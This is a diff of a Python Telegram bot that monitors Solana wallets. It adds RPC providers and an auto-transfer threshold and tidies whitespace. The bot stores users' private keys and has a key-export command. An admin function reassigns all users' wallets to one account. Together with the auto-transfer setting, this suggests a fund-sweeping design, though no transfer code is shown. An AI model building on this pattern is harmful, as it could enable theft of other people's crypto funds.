@@ -65,7 +65,7 @@ RPC_PROVIDERS = {
     },
     'secondary': {
         'url': SOLANA_RPC_URL2,
-        'name': 'Alchemy Secondary', 
+        'name': 'Alchemy Secondary',
         'max_requests_per_second': 20,  # تقليل قليلاً لتجنب rate limiting
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
     },
@@ -98,6 +98,24 @@ RPC_PROVIDERS = {
         'name': 'Alchemy Extra 3',
         'max_requests_per_second': 25,  # مزود Alchemy إضافي
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
+    },
+    'rpc_provider_8': {
+        'url': os.getenv("RPC_URL8"),
+        'name': 'RPC Provider 8',
+        'max_requests_per_second': 20,  # مزود إضافي 8
+        'priority': 1  # نفس الأولوية للتوزيع المتوازن
+    },
+    'rpc_provider_9': {
+        'url': os.getenv("RPC_URL9"),
+        'name': 'RPC Provider 9',
+        'max_requests_per_second': 20,  # مزود إضافي 9
+        'priority': 1  # نفس الأولوية للتوزيع المتوازن
+    },
+    'rpc_provider_10': {
+        'url': os.getenv("RPC_URL10"),
+        'name': 'RPC Provider 10',
+        'max_requests_per_second': 20,  # مزود إضافي 10
+        'priority': 1  # نفس الأولوية للتوزيع المتوازن
     }
 }
 
@@ -111,7 +129,7 @@ BATCH_SIZE = 25     # حجم دفعة أقل لتوزيع أفضل
 BATCH_DELAY = 0.3   # تقليل التأخير بين الدفعات
 MAX_RETRIES = 2     # Keep retries low for speed
 TARGET_CYCLE_TIME = 60  # Target cycle completion time in seconds
-MAX_RPC_CALLS_PER_SECOND = 135  # Global rate limit for all providers combined (20+20+15+10+25+25+25-5 buffer)
+MAX_RPC_CALLS_PER_SECOND = 195  # Global rate limit for all providers combined (20+20+15+10+25+25+25+20+20+20-5 buffer)
 
 # تحسين إضافي للأداء
 ADAPTIVE_BATCH_SIZING = True  # تمكين حجم الدفعة التكيفي
@@ -119,6 +137,9 @@ SUCCESS_THRESHOLD_FOR_SPEEDUP = 3  # عدد النجاحات المتتالية 
 
 # Dust transaction filter - تقليل الحد الأدنى للحصول على إشعارات أكثر
 MIN_NOTIFICATION_AMOUNT = 0.0001  # SOL - حد أدنى أقل لضمان اكتشاف المعاملات الصغيرة
+
+# Auto-transfer configuration
+MIN_AUTO_TRANSFER_AMOUNT = 0.09  # SOL - الحد الأدنى للتحويل التلقائي
 
 # Channel and Admin Configuration
 MONITORING_CHANNEL = int(os.getenv("ID_CHAT")) if os.getenv("ID_CHAT") else None
@@ -139,7 +160,7 @@ MESSAGES = {
     "monitoring_status": "📊 حالة المراقبة:\n\n{status}",
     "wallet_already_monitored": "⚠️ هذه المحفظة مراقبة بالفعل.",
     "select_wallet_to_stop": "اختر المحفظة التي تريد إيقاف مراقبتها:",
-    "help_text": "🤖 بوت مراقبة محافظ سولانا\n\nهذا البوت يساعدك في مراقبة معاملات محافظ سولانا والحصول على إشعارات فورية.\n\n🔧 يعمل حالياً على شبكة Devnet للتجربة\n\n📋 الأوامر:\n/start - بدء البوت\n/monitor - بدء مراقبة محفظة جديدة\n/add - إضافة عدة محافظ دفعة واحدة\n/stop - إيقاف مراقبة محفظة\n/stop <عنوان> - إيقاف مراقبة محفظة محددة\n/list - عرض المحافظ المراقبة\n/r - عرض المحافظ التي بها رصيد SOL فقط\n/k - تصدير المفاتيح الخاصة\n/stats - عرض إحصائيات النظام والأداء\n/help - عرض هذه المساعدة\n\n👑 أوامر المشرف:\n/filter - تعديل الحد الأدنى للإشعارات\n/transfer - نقل جميع المحافظ لمستخدم محدد\n\n💡 نصائح:\n• يمكنك استخدام جزء من عنوان المحفظة مع /stop\n• مثال: /stop 7xKXtg2CW\n\n🚀 لإنشاء محفظة تجريبية:\n1. اذهب إلى https://solana.fm/address\n2. انقر على 'Generate Keypair'\n3. احفظ المفتاح الخاص والعنوان\n4. احصل على SOL تجريبي من https://faucet.solana.com\n\n⚠️ تنبيه أمني:\nلا تشارك مفاتيحك الخاصة مع أي شخص آخر!"
+    "help_text": "🤖 بوت مراقبة محافظ سولانا\n\nهذا البوت يساعدك في مراقبة معاملات محافظ سولانا والحصول على إشعارات فورية.\n\n🔧 يعمل حالياً على شبكة Devnet للتجربة\n\n📋 الأوامر:\n/start - بدء البوت\n/monitor - بدء مراقبة محفظة جديدة\n/add - إضافة عدة محافظ دفعة واحدة\n/stop - إيقاف مراقبة محفظة\n/stop <عنوان> - إيقاف مراقبة محفظة محددة\n/list - عرض المحافظ المراقبة\n/r - عرض المحافظ التي بها رصيد SOL فقط\n/k - تصدير المفاتيح الخاصة\n/stats - عرض إحصائيات النظام والأداء\n/help - عرض هذه المساعدة\n\n👑 أوامر المشرف:\n/filter - تعديل الحد الأدنى للإشعارات\n/0 - تعديل الحد الأدنى للتحويل التلقائي\n/transfer - نقل جميع المحافظ لمستخدم محدد\n\n💡 نصائح:\n• يمكنك استخدام جزء من عنوان المحفظة مع /stop\n• مثال: /stop 7xKXtg2CW\n\n🚀 لإنشاء محفظة تجريبية:\n1. اذهب إلى https://solana.fm/address\n2. انقر على 'Generate Keypair'\n3. احفظ المفتاح الخاص والعنوان\n4. احصل على SOL تجريبي من https://faucet.solana.com\n\n⚠️ تنبيه أمني:\nلا تشارك مفاتيحك الخاصة مع أي شخص آخر!"
 }
 
 
@@ -245,7 +266,7 @@ class DatabaseManager:
                     updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
             """)
-            
+
             await db.commit()
 
     def _encrypt_private_key(self, private_key: str) -> str:
@@ -292,7 +313,7 @@ class DatabaseManager:
         try:
             async with aiosqlite.connect(self.database_file) as db:
                 cursor = await db.execute("""
-                    UPDATE monitored_wallets 
+                    UPDATE monitored_wallets
                     SET is_active = FALSE, updated_at = CURRENT_TIMESTAMP
                     WHERE chat_id = ? AND wallet_address = ? AND is_active = TRUE
                 """, (chat_id, wallet_address))
@@ -308,7 +329,7 @@ class DatabaseManager:
             async with aiosqlite.connect(self.database_file) as db:
                 async with db.execute("""
                     SELECT wallet_address, nickname, last_signature, monitoring_start_time, created_at, updated_at
-                    FROM monitored_wallets 
+                    FROM monitored_wallets
                     WHERE chat_id = ? AND is_active = TRUE
                 """, (chat_id,)) as cursor:
                     rows = await cursor.fetchall()
@@ -366,7 +387,7 @@ class DatabaseManager:
             async with aiosqlite.connect(self.database_file) as db:
                 async with db.execute("""
                     SELECT chat_id, wallet_address, nickname, last_signature, monitoring_start_time, created_at, updated_at
-                    FROM monitored_wallets 
+                    FROM monitored_wallets
                     WHERE wallet_address = ? AND is_active = TRUE
                 """, (wallet_address,)) as cursor:
                     rows = await cursor.fetchall()
@@ -404,7 +425,7 @@ class DatabaseManager:
         try:
             async with aiosqlite.connect(self.database_file) as db:
                 await db.execute("""
-                    UPDATE monitored_wallets 
+                    UPDATE monitored_wallets
                     SET last_signature = ?, updated_at = CURRENT_TIMESTAMP
                     WHERE wallet_address = ? AND is_active = TRUE
                 """, (signature, wallet_address))
@@ -414,14 +435,14 @@ class DatabaseManager:
             logger.error(f"Error updating last signature: {e}")
             return False
 
-    async def add_transaction_record(self, wallet_address: str, chat_id: int, signature: str, 
+    async def add_transaction_record(self, wallet_address: str, chat_id: int, signature: str,
                                    amount: str, tx_type: str, block_time: int) -> bool:
         """Add a transaction record"""
         try:
             timestamp = datetime.fromtimestamp(block_time) if block_time else datetime.now()
             async with aiosqlite.connect(self.database_file) as db:
                 cursor = await db.execute("""
-                    INSERT OR IGNORE INTO transaction_history 
+                    INSERT OR IGNORE INTO transaction_history
                     (wallet_address, chat_id, signature, amount, tx_type, timestamp, block_time, notified)
                     VALUES (?, ?, ?, ?, ?, ?, ?, TRUE)
                 """, (wallet_address, chat_id, signature, amount, tx_type, timestamp, block_time))
@@ -437,7 +458,7 @@ class DatabaseManager:
         try:
             async with aiosqlite.connect(self.database_file) as db:
                 async with db.execute("""
-                    SELECT COUNT(*) FROM transaction_history 
+                    SELECT COUNT(*) FROM transaction_history
                     WHERE signature = ? AND notified = TRUE
                 """, (signature,)) as cursor:
                     result = await cursor.fetchone()
@@ -479,50 +500,50 @@ class DatabaseManager:
             async with aiosqlite.connect(self.database_file) as db:
                 # Get statistics before transfer
                 async with db.execute("""
-                    SELECT 
+                    SELECT
                         COUNT(*) as total_wallets,
                         COUNT(DISTINCT chat_id) as unique_users
-                    FROM monitored_wallets 
+                    FROM monitored_wallets
                     WHERE is_active = TRUE
                 """) as cursor:
                     stats_row = await cursor.fetchone()
-                
+
                 # Get detailed breakdown by user
                 async with db.execute("""
-                    SELECT 
+                    SELECT
                         chat_id,
                         COUNT(*) as wallet_count
-                    FROM monitored_wallets 
+                    FROM monitored_wallets
                     WHERE is_active = TRUE
                     GROUP BY chat_id
                     ORDER BY wallet_count DESC
                 """) as cursor:
                     user_breakdown_rows = await cursor.fetchall()
-                
+
                 # Perform the transfer
                 cursor = await db.execute("""
-                    UPDATE monitored_wallets 
+                    UPDATE monitored_wallets
                     SET chat_id = ?, updated_at = CURRENT_TIMESTAMP
                     WHERE is_active = TRUE
                 """, (target_chat_id,))
                 await db.commit()
-                
+
                 # Get the number of updated rows
                 updated_count = cursor.rowcount
-                
+
                 transfer_info = {
                     'total_wallets': stats_row[0],
                     'unique_users': stats_row[1],
                     'updated_count': updated_count,
                     'user_breakdown': [
-                        {'chat_id': row[0], 'wallet_count': row[1]} 
+                        {'chat_id': row[0], 'wallet_count': row[1]}
                         for row in user_breakdown_rows
                     ]
                 }
-                
+
                 logger.info(f"Transferred {updated_count} wallets from {stats_row[1]} users to user {target_chat_id}")
                 return True, transfer_info
-                
+
         except Exception as e:
             logger.error(f"Error transferring wallets: {e}")
             return False, {'error': str(e)}
@@ -610,7 +631,7 @@ class MultiRPCRateLimiter:
         self.lock = asyncio.Lock()
         self.global_requests = []  # Track all requests across providers
         self.performance_mode = 'normal'  # Add global performance mode
-        
+
         # Add missing global attributes
         self.current_delay = BASE_DELAY
         self.success_count = 0
@@ -619,7 +640,7 @@ class MultiRPCRateLimiter:
         self.last_error_time = None
         self.last_429_time = None
         self.recent_requests = []
-        
+
         # Initialize each provider's state
         for provider_id, config in RPC_PROVIDERS.items():
             if config['url']:  # Only initialize if URL is provided
@@ -636,45 +657,45 @@ class MultiRPCRateLimiter:
                     'is_available': True,
                     'health_score': 100.0  # 0-100 score for provider health
                 }
-        
+
         logger.info(f"🔄 Initialized {len(self.providers)} RPC providers: {list(self.providers.keys())}")
 
     def get_optimal_provider(self) -> str:
         """نظام اختيار مزود ذكي ومتوازن تماماً بدون تفضيل أي مزود"""
         if not self.providers:
             return None
-            
+
         current_time = asyncio.get_event_loop().time()
-        
+
         # تحضير قائمة المزودين المتاحين مع معايير التوازن
         available_providers = []
-        
+
         for provider_id, provider_data in self.providers.items():
             config = provider_data['config']
-            
+
             # تنظيف الطلبات القديمة - نافذة 1 ثانية
             provider_data['recent_requests'] = [
-                t for t in provider_data['recent_requests'] 
+                t for t in provider_data['recent_requests']
                 if current_time - t < 1.0
             ]
-            
+
             # تخطي المزودين غير المتاحين فقط
             if not provider_data['is_available']:
                 continue
-            
+
             # حساب المعايير الأساسية
             current_load = len(provider_data['recent_requests'])
             max_capacity = config['max_requests_per_second']
             load_percentage = (current_load / max_capacity) * 100
-            
+
             # تخطي المزودين المحملين بأكثر من 90% فقط
             if load_percentage >= 90:
                 continue
-            
+
             # حساب نقاط التوازن
             total_usage = provider_data['success_count'] + provider_data['fail_count']
             health_score = provider_data['health_score']
-            
+
             # معادلة التوازن الذكي - جميع المزودين يبدأون بنفس الأولوية
             balance_score = (
                 (100 - load_percentage) * 0.4 +  # 40% حمولة حالية
@@ -682,7 +703,7 @@ class MultiRPCRateLimiter:
                 (max_capacity - current_load) * 0.2 +  # 20% سعة متاحة
                 (1000 / max(1, total_usage)) * 0.1     # 10% توزيع عادل للاستخدام
             )
-            
+
             available_providers.append({
                 'id': provider_id,
                 'balance_score': balance_score,
@@ -692,50 +713,50 @@ class MultiRPCRateLimiter:
                 'max_capacity': max_capacity,
                 'total_usage': total_usage
             })
-        
+
         if not available_providers:
             # احتياطي: أول مزود متاح
             for provider_id, provider_data in self.providers.items():
                 if provider_data['is_available']:
                     return provider_id
             return list(self.providers.keys())[0] if self.providers else None
-        
+
         # **خوارزمية التوزيع المتوازن الذكي**
-        
+
         # إذا كان جميع المزودين متساويين تقريباً، استخدم Round-Robin صارم
         scores = [p['balance_score'] for p in available_providers]
         score_variance = max(scores) - min(scores)
-        
+
         if score_variance < 20:  # التفاوت قليل، استخدم Round-Robin
             if not hasattr(self, '_smart_rotation_index'):
                 self._smart_rotation_index = 0
-            
+
             # ترتيب أبجدي للحصول على نتائج متسقة
             available_providers.sort(key=lambda x: x['id'])
-            
+
             selected_index = self._smart_rotation_index % len(available_providers)
             self._smart_rotation_index = (self._smart_rotation_index + 1) % len(available_providers)
-            
+
             return available_providers[selected_index]['id']
-        
+
         else:  # هناك تفاوت واضح، اختر الأفضل مع عشوائية طفيفة
             # ترتيب حسب النقاط
             available_providers.sort(key=lambda x: x['balance_score'], reverse=True)
-            
+
             # اختيار من أفضل 50% من المزودين لضمان التوازن
             top_providers = available_providers[:max(1, len(available_providers) // 2)]
-            
+
             # إذا كان هناك مزود واحد فقط، اختره
             if len(top_providers) == 1:
                 return top_providers[0]['id']
-            
+
             # تطبيق Round-Robin على أفضل المزودين
             if not hasattr(self, '_top_rotation_index'):
                 self._top_rotation_index = 0
-            
+
             selected_index = self._top_rotation_index % len(top_providers)
             self._top_rotation_index = (self._top_rotation_index + 1) % len(top_providers)
-            
+
             return top_providers[selected_index]['id']
 
     async def acquire(self, preferred_provider: str = None):
@@ -743,35 +764,35 @@ class MultiRPCRateLimiter:
         async with self.lock:
             # اختيار المزود مع نظام Round-Robin الذكي
             provider_id = preferred_provider or self.get_optimal_provider()
-            
+
             if not provider_id or provider_id not in self.providers:
                 if self.providers:
                     provider_id = list(self.providers.keys())[0]  # Fallback to first available
                 else:
                     raise Exception("No RPC providers configured")
-            
+
             provider_data = self.providers[provider_id]
             current_time = asyncio.get_event_loop().time()
-            
+
             # تنظيف الطلبات القديمة
             provider_data['recent_requests'] = [
-                t for t in provider_data['recent_requests'] 
+                t for t in provider_data['recent_requests']
                 if current_time - t < 1.0
             ]
             self.global_requests = [
-                t for t in self.global_requests 
+                t for t in self.global_requests
                 if current_time - t < 10.0
             ]
-            
+
             # **فحص حماية من التحميل المفرط**
             config = provider_data['config']
             recent_count = len(provider_data['recent_requests'])
             load_percentage = (recent_count / config['max_requests_per_second']) * 100
-            
+
             # إذا كان المزود محمل جداً، حاول العثور على بديل
             if load_percentage >= 85:
                 logger.warning(f"⚠️ {provider_id} overloaded ({load_percentage:.0f}%), searching for alternative")
-                
+
                 # البحث عن مزود بديل أقل حمولة
                 alternative_provider = self._find_least_loaded_provider(exclude=provider_id)
                 if alternative_provider:
@@ -781,7 +802,7 @@ class MultiRPCRateLimiter:
                     recent_count = len(provider_data['recent_requests'])
                     load_percentage = (recent_count / config['max_requests_per_second']) * 100
                     logger.info(f"🔄 Switched to {provider_id} ({load_percentage:.0f}% load)")
-            
+
             # تطبيق تأخير ذكي بناءً على الحمولة الحالية
             if load_percentage >= 80:
                 # حمولة عالية جداً - تأخير أطول مع تحذير
@@ -801,39 +822,39 @@ class MultiRPCRateLimiter:
                 wait_time = max(provider_data['current_delay'], 0.02)
                 await asyncio.sleep(wait_time)
             # أقل من 20% - بدون تأخير إضافي
-            
+
             # تسجيل الطلب
             provider_data['recent_requests'].append(current_time)
             self.global_requests.append(current_time)
-            
+
             # تحديث إحصائيات الاستخدام لمراقبة التوزيع
             self._update_usage_distribution(provider_id)
-            
+
             return provider_id, provider_data['config']['url']
-    
+
     def _find_least_loaded_provider(self, exclude: str = None) -> str:
         """العثور على المزود الأقل حمولة (باستثناء المزود المستبعد)"""
         current_time = asyncio.get_event_loop().time()
         best_provider = None
         lowest_load = float('inf')
-        
+
         for provider_id, provider_data in self.providers.items():
             if provider_id == exclude or not provider_data['is_available']:
                 continue
-                
+
             config = provider_data['config']
             recent_count = len([t for t in provider_data['recent_requests'] if current_time - t < 1.0])
             load_percentage = (recent_count / config['max_requests_per_second']) * 100
-            
+
             # تفضيل المزودين بحالة صحية جيدة وحمولة منخفضة
             adjusted_load = load_percentage * (1.0 - (provider_data['health_score'] / 200.0))
-            
+
             if adjusted_load < lowest_load:
                 lowest_load = adjusted_load
                 best_provider = provider_id
-        
+
         return best_provider
-    
+
     def _update_usage_distribution(self, provider_id: str):
         """تتبع توزيع الاستخدام مع ضمان العدالة"""
         if not hasattr(self, '_usage_distribution'):
@@ -841,26 +862,26 @@ class MultiRPCRateLimiter:
             self._usage_distribution = {}
             for pid in self.providers.keys():
                 self._usage_distribution[pid] = 0
-        
+
         self._usage_distribution[provider_id] = self._usage_distribution.get(provider_id, 0) + 1
-        
+
         # مراقبة التوزيع العادل كل 50 طلب
         total_requests = sum(self._usage_distribution.values())
         if total_requests % 50 == 0 and total_requests > 0:
             distribution_info = []
             max_usage = max(self._usage_distribution.values())
             min_usage = min(self._usage_distribution.values())
-            
+
             for pid, count in self._usage_distribution.items():
                 percentage = (count / total_requests) * 100
                 distribution_info.append(f"{pid}:{percentage:.1f}%")
-            
+
             # تحذير إذا كان التوزيع غير متوازن
             usage_variance = max_usage - min_usage
             balance_status = "⚖️ متوازن" if usage_variance <= 10 else "⚠️ غير متوازن"
-            
+
             logger.debug(f"📊 توزيع الاستخدام ({balance_status}) بعد {total_requests} طلب: {', '.join(distribution_info)}")
-            
+
             # إعادة توازن تلقائي إذا كان التوزيع غير عادل جداً
             if usage_variance > 20 and total_requests > 100:
                 logger.info("🔄 تطبيق إعادة التوازن التلقائي بسبب التوزيع غير العادل")
@@ -870,27 +891,27 @@ class MultiRPCRateLimiter:
         """معالجة محسنة للطلبات الناجحة مع تحسين التوزيع"""
         if provider_id not in self.providers:
             return
-            
+
         async with self.lock:
             provider_data = self.providers[provider_id]
             provider_data['success_count'] += 1
             provider_data['consecutive_successes'] += 1
-            
+
             # تحسين أسرع لنقاط الصحة
             provider_data['health_score'] = min(100.0, provider_data['health_score'] + 1.5)
-            
+
             # تقليل التأخير بشكل أكثر عدوانية للحصول على توزيع أفضل
             if provider_data['consecutive_successes'] >= 3:
                 old_delay = provider_data['current_delay']
                 provider_data['current_delay'] = max(
-                    MIN_DELAY, 
+                    MIN_DELAY,
                     provider_data['current_delay'] * 0.9  # تقليل أكثر تدرجاً
                 )
                 provider_data['consecutive_successes'] = 0
-                
+
                 if old_delay != provider_data['current_delay']:
                     logger.debug(f"🟢 {provider_id}: Reduced delay from {old_delay:.3f}s to {provider_data['current_delay']:.3f}s")
-            
+
             # إعادة تمكين المزود إذا كان معطلاً وحالته جيدة
             if not provider_data['is_available'] and provider_data['health_score'] > 60:
                 provider_data['is_available'] = True
@@ -900,39 +921,39 @@ class MultiRPCRateLimiter:
         """معالجة محسنة لأخطاء Rate Limiting مع حماية من التحميل المفرط"""
         if provider_id not in self.providers:
             return
-            
+
         async with self.lock:
             provider_data = self.providers[provider_id]
             provider_data['fail_count'] += 1
             provider_data['consecutive_successes'] = 0
             current_time = asyncio.get_event_loop().time()
             provider_data['last_429_time'] = current_time
-            
+
             # **تقليل أكثر صرامة في نقاط الصحة لمنع التحميل المفرط**
             old_health = provider_data['health_score']
             provider_data['health_score'] = max(10.0, provider_data['health_score'] - 8.0)
-            
+
             # زيادة التأخير بناءً على تكرار الأخطاء
             old_delay = provider_data['current_delay']
             multiplier = 1.2 if provider_data['fail_count'] % 3 == 0 else 1.1
             provider_data['current_delay'] = min(MAX_DELAY, provider_data['current_delay'] * multiplier)
-            
+
             # **منطق تعطيل أكثر صرامة لحماية المزودين**
             if provider_data['health_score'] < 40 or provider_data['fail_count'] >= 5:
                 provider_data['is_available'] = False
                 cooldown_time = min(30, 10 + (provider_data['fail_count'] * 2))  # زيادة وقت التبريد
-                
+
                 logger.warning(f"🔴 {provider_id}: Disabled due to rate limiting (health: {old_health:.0f}% → {provider_data['health_score']:.0f}%, fails: {provider_data['fail_count']})")
                 logger.info(f"🕐 {provider_id}: Will be re-enabled in {cooldown_time}s")
-                
+
                 # إعادة تمكين بعد فترة تبريد متدرجة
                 asyncio.create_task(self._re_enable_provider(provider_id, cooldown_time))
-            
+
             # **إعادة توزيع الحمولة فوراً**
             self._rebalance_load_distribution()
-            
+
             logger.warning(f"🔴 {provider_id}: Rate limit hit! Health: {old_health:.0f}% → {provider_data['health_score']:.0f}%, Delay: {old_delay:.3f}s → {provider_data['current_delay']:.3f}s")
-    
+
     def _rebalance_load_distribution(self):
         """إعادة توزيع الحمولة عند حدوث مشاكل - نظام ذكي ومتوازن"""
         # إعادة تعيين جميع فهارس التناوب للبدء من جديد
@@ -942,50 +963,50 @@ class MultiRPCRateLimiter:
             self._top_rotation_index = 0
         if hasattr(self, '_provider_rotation_index'):
             self._provider_rotation_index = 0
-        
+
         # إعادة توزيع إحصائيات الاستخدام بطريقة متوازنة
         if hasattr(self, '_usage_distribution'):
             total_usage = sum(self._usage_distribution.values())
             if total_usage > 0:
                 # إعادة توزيع الإحصائيات بشكل متساوٍ بين المزودين المتاحين
                 available_providers = [
-                    pid for pid, pdata in self.providers.items() 
+                    pid for pid, pdata in self.providers.items()
                     if pdata['is_available']
                 ]
-                
+
                 if available_providers:
                     # توزيع متساوٍ للإحصائيات
                     avg_usage = total_usage // len(available_providers)
                     for provider_id in available_providers:
                         self._usage_distribution[provider_id] = avg_usage
-                    
+
                     # توزيع المتبقي
                     remainder = total_usage % len(available_providers)
                     for i in range(remainder):
                         provider_id = available_providers[i]
                         self._usage_distribution[provider_id] += 1
-        
+
         # إعادة ضبط نقاط الصحة للمزودين المتاحين لتكون متوازنة
         for provider_id, provider_data in self.providers.items():
             if provider_data['is_available'] and provider_data['health_score'] > 70:
                 # تطبيع نقاط الصحة لتجنب التحيز
                 provider_data['health_score'] = min(95, provider_data['health_score'] + 5)
-        
+
         logger.debug("🔄 Smart load distribution rebalanced - all providers reset for fair distribution")
 
     async def on_network_error(self, provider_id: str):
         """Handle network error"""
         if provider_id not in self.providers:
             return
-            
+
         async with self.lock:
             provider_data = self.providers[provider_id]
             provider_data['fail_count'] += 1
             provider_data['consecutive_successes'] = 0
-            
+
             # Light decrease in health score
             provider_data['health_score'] = max(0.0, provider_data['health_score'] - 5.0)
-            
+
             # Light increase in delay
             provider_data['current_delay'] = min(MAX_DELAY, provider_data['current_delay'] * 1.1)
 
@@ -998,20 +1019,21 @@ class MultiRPCRateLimiter:
             logger.info(f"🟢 {provider_id}: Re-enabled after cooldown")
 
     def get_stats(self) -> dict:
-        """Get comprehensive statistics"""
+        """Get current rate limiter statistics"""
         current_time = asyncio.get_event_loop().time()
-        global_rate = len([t for t in self.global_requests if current_time - t < 10])
-        
+        recent_rate = len([t for t in self.recent_requests if current_time - t < 10])  # Last 10 seconds
+
+        # Get provider stats
         provider_stats = {}
         total_requests = 0
         total_errors = 0
-        
+
         for provider_id, provider_data in self.providers.items():
             recent_requests = len([t for t in provider_data['recent_requests'] if current_time - t < 10])
             provider_total = provider_data['success_count'] + provider_data['fail_count']
             total_requests += provider_total
             total_errors += provider_data['fail_count']
-            
+
             provider_stats[provider_id] = {
                 'name': provider_data['config']['name'],
                 'health_score': provider_data['health_score'],
@@ -1024,12 +1046,19 @@ class MultiRPCRateLimiter:
                 'fail_count': provider_data['fail_count'],
                 'consecutive_successes': provider_data['consecutive_successes']
             }
-        
+
         return {
-            'global_rate': global_rate,
+            'current_delay': self.current_delay,
+            'success_count': self.success_count,
+            'fail_count': self.fail_count,
+            'consecutive_successes': self.consecutive_successes,
+            'performance_mode': self.performance_mode,
+            'recent_request_rate': recent_rate,
+            'time_since_last_429': current_time - self.last_429_time if self.last_429_time else None,
+            'global_rate': recent_rate,
             'total_requests': total_requests,
             'total_errors': total_errors,
-            'success_rate': ((total_requests - total_errors) / total_requests * 100) if total_requests > 0 else 0,
+            'success_rate': ((total_requests - total_errors) / total_requests * 100) if total_requests > 0 else 100,
             'providers': provider_stats,
             'optimal_provider': self.get_optimal_provider()
         }
@@ -1038,14 +1067,14 @@ class MultiRPCRateLimiter:
         """Calculate optimal batch size for 60-second target"""
         if not self.providers:
             return BATCH_SIZE
-            
+
         # Calculate total available capacity
         total_capacity = sum(
-            provider_data['config']['max_requests_per_second'] 
-            for provider_data in self.providers.values() 
+            provider_data['config']['max_requests_per_second']
+            for provider_data in self.providers.values()
             if provider_data['is_available']
         )
-        
+
         # Aim for 60-second cycle: adjust batch size based on capacity
         optimal_size = max(BATCH_SIZE, min(25, int(total_capacity * 0.6)))
         return optimal_size
@@ -1054,18 +1083,18 @@ class MultiRPCRateLimiter:
         """Get current rate limiter statistics"""
         current_time = asyncio.get_event_loop().time()
         recent_rate = len([t for t in self.recent_requests if current_time - t < 10])  # Last 10 seconds
-        
+
         # Get provider stats
         provider_stats = {}
         total_requests = 0
         total_errors = 0
-        
+
         for provider_id, provider_data in self.providers.items():
             recent_requests = len([t for t in provider_data['recent_requests'] if current_time - t < 10])
             provider_total = provider_data['success_count'] + provider_data['fail_count']
             total_requests += provider_total
             total_errors += provider_data['fail_count']
-            
+
             provider_stats[provider_id] = {
                 'name': provider_data['config']['name'],
                 'health_score': provider_data['health_score'],
@@ -1078,7 +1107,7 @@ class MultiRPCRateLimiter:
                 'fail_count': provider_data['fail_count'],
                 'consecutive_successes': provider_data['consecutive_successes']
             }
-        
+
         return {
             'current_delay': self.current_delay,
             'success_count': self.success_count,
@@ -1119,7 +1148,7 @@ class SolanaMonitor:
     async def make_rpc_call(self, payload: dict, max_retries: int = MAX_RETRIES, preferred_provider: str = None):
         """Smart RPC call with multi-provider load balancing and intelligent retry logic"""
         used_providers = set()
-        
+
         for attempt in range(max_retries):
             try:
                 # Get optimal provider and URL
@@ -1129,17 +1158,17 @@ class SolanaMonitor:
                 if not self.session:
                     await self.start_session()
 
-                # Make the request with timeout  
+                # Make the request with timeout
                 async with self.session.post(rpc_url, json=payload, timeout=15) as response:
                     if response.status == 200:
                         data = await response.json()
                         # Notify rate limiter of success
                         await self.rate_limiter.on_success(provider_id)
                         return data
-                    
+
                     elif response.status == 429:  # Rate limit hit
                         await self.rate_limiter.on_rate_limit_error(provider_id)
-                        
+
                         if attempt < max_retries - 1:
                             # Try different provider if available
                             if len(used_providers) < len(self.rate_limiter.providers):
@@ -1155,10 +1184,10 @@ class SolanaMonitor:
                         else:
                             logger.error(f"Rate limit exceeded on all providers after {max_retries} attempts")
                             return None
-                    
+
                     elif response.status in [500, 502, 503, 504]:  # Server errors
                         await self.rate_limiter.on_network_error(provider_id)
-                        
+
                         if attempt < max_retries - 1:
                             # Try different provider for server errors
                             if len(used_providers) < len(self.rate_limiter.providers):
@@ -1173,14 +1202,14 @@ class SolanaMonitor:
                         else:
                             logger.error(f"Server error {response.status} on all providers")
                             return None
-                    
+
                     else:
                         logger.error(f"Unexpected HTTP status {response.status} from {provider_id}")
                         return None
 
             except asyncio.TimeoutError:
                 await self.rate_limiter.on_network_error(provider_id)
-                
+
                 if attempt < max_retries - 1:
                     # Try different provider for timeouts
                     if len(used_providers) < len(self.rate_limiter.providers):
@@ -1198,7 +1227,7 @@ class SolanaMonitor:
 
             except aiohttp.ClientError as e:
                 await self.rate_limiter.on_network_error(provider_id)
-                
+
                 if attempt < max_retries - 1:
                     wait_time = min(1.5 ** attempt, 5.0)
                     logger.warning(f"Network error on {provider_id}: {e}, waiting {wait_time:.1f}s")
@@ -1291,7 +1320,7 @@ class SolanaMonitor:
                 try:
                     self.cycle_start_time = asyncio.get_event_loop().time()
                     cycle_count += 1
-                    
+
                     # Get all active wallets
                     all_wallets = await self.db_manager.get_all_monitored_wallets()
 
@@ -1305,34 +1334,34 @@ class SolanaMonitor:
                     batch_results = []
                     total_successful = 0
                     total_failed = 0
-                    
+
                     # Get optimal batch size from multi-RPC rate limiter
                     current_batch_size = self.rate_limiter.get_optimal_batch_size()
                     num_batches = (len(all_wallets) + current_batch_size - 1) // current_batch_size
-                    
+
                     # Calculate target time per batch to meet 60-second cycle goal
                     target_processing_time = TARGET_CYCLE_TIME - POLLING_INTERVAL - 5  # Leave 5s buffer
                     target_time_per_batch = target_processing_time / num_batches if num_batches > 0 else target_processing_time
-                    
+
                     limiter_stats = self.rate_limiter.get_stats()
                     optimal_provider = limiter_stats.get('optimal_provider', 'primary')
-                    
+
                     logger.debug(f"📊 Multi-RPC batch size: {current_batch_size}, Target: {target_time_per_batch:.1f}s/batch, Optimal provider: {optimal_provider}")
-                    
+
                     for i in range(0, len(all_wallets), current_batch_size):
                         batch_start = asyncio.get_event_loop().time()
                         batch = all_wallets[i:i + current_batch_size]
                         batch_number = i // current_batch_size + 1
-                        
+
                         logger.debug(f"🎯 Processing batch {batch_number}/{num_batches} ({len(batch)} wallets)")
-                        
+
                         # Process this batch with provider load balancing
                         batch_result = await self.process_wallet_batch(batch, batch_number, len(all_wallets))
                         batch_results.append(batch_result)
-                        
+
                         total_successful += batch_result['successful_checks']
                         total_failed += batch_result['failed_checks']
-                        
+
                         # Dynamic delay adjustment based on timing vs target
                         batch_time = asyncio.get_event_loop().time() - batch_start
                         if i + current_batch_size < len(all_wallets):
@@ -1342,29 +1371,29 @@ class SolanaMonitor:
                                 dynamic_delay = BATCH_DELAY * 0.2  # Minimal delay
                             else:
                                 dynamic_delay = BATCH_DELAY
-                            
+
                             logger.debug(f"⏱️ Batch time: {batch_time:.1f}s (target: {target_time_per_batch:.1f}s), delay: {dynamic_delay:.1f}s")
                             await asyncio.sleep(dynamic_delay)
-                    
+
                     # Calculate cycle time and performance metrics
                     cycle_time = asyncio.get_event_loop().time() - self.cycle_start_time
